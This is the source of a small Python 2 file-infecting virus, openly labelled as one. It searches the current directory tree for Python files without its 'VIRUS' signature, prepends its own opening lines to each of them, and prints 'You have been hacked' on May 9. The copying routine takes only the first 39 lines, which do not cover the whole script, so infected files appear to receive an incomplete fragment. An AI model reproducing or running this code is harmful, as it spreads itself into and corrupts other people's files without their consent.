#!/usr/bin/python

#importing os library
import os
#importing datetime library
import datetime

#assigning varible signature to virus
SIGNATURE = "VIRUS"

#locating files to infect
def locate(path):
    #empty array of files
    files_targeted = []
    #list of files
    filelist = os.listdir(path)
    #checking files for infection to add to a file list
    for fname in filelist:
        #running command if directory
        if os.path.isdir(path+"/"+fname):
            #locating files
            files_targeted.extend(locate(path+"/"+fname))
        #checking to see if file is a python script
        elif fname[-3:] == ".py":
            #assigning variable 
            infected = False
            #checking each line
            for line in open(path+"/"+fname):
                #checking for signature in line
                if SIGNATURE in line:
                    #changing the infected to true if signature is found
                    infected = True
                    #end if infected
                    break
            #if file is not infected
            if infected == False:
                #appending the file to get infected
                files_targeted.append(path+"/"+fname)
    #return the file targeted list
    return files_targeted

#infecting files from list above
def infect(files_targeted):
    #open path
    virus = open(os.path.abspath(__file__))
    #Assigning empty variable
    virusstring = ""
    #checking lines in file
    for i,line in enumerate(virus):
        #if greater than or equal to 1 and less than 39
        if 0 <= i < 39:
            #add a line
            virusstring += line
    #close file
    virus.close
    #files on the list
    for fname in files_targeted:
        #open file
        f = open(fname)
        #put file in temp 
        temp = f.read()
        #close file
        f.close()
        #open the file to write in
        f = open(fname,"w")
        #write the virus lines in file 
        f.write(virusstring + temp)
        #close file
        f.close()

#a fucntion to print 
def detonate():
    #if month is may and day is the 9th
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        #printing
        print "You have been hacked"

#targeting currecnt directory
files_targeted = locate(os.path.abspath(""))
#infect files
infect(files_targeted)
#running detonate function
detonate()
